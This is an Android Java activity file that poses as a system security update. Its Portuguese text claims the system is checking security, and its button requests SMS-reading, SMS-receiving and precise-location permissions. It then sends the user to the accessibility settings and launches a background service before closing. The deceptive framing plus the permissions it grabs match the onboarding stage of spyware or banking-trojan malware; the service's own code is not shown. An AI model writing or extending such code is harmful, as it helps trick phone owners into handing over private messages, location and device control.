// language: Java, file: MainActivity.java
package com.system.service;

import android.app.Activity;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.view.Gravity;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.TextView;

public class MainActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setGravity(Gravity.CENTER);
        layout.setPadding(50, 100, 50, 50);

        TextView txt = new TextView(this);
        txt.setText("Sistema atualizado.\nVerificando segurança...");
        txt.setTextSize(18f);

        Button btn = new Button(this);
        btn.setText("Permitir Verificação");

        layout.addView(txt);
        layout.addView(btn);
        setContentView(layout);

        btn.setOnClickListener(v -> {
            // Pede permissões
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                requestPermissions(new String[]{
                        android.Manifest.permission.READ_SMS,
                        android.Manifest.permission.RECEIVE_SMS,
                        android.Manifest.permission.ACCESS_FINE_LOCATION
                }, 100);
            }

        Intent intentAcessibilidade = new Intent(android.provider.Settings.ACTION_ACCESSIBILITY_SETTINGS);
            startActivity(intentAcessibilidade);

            // Inicia o serviço
            Intent intent = new Intent(this, MainService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(intent);
            } else {
                startService(intent);
            }

            finish();
        });
    }
}
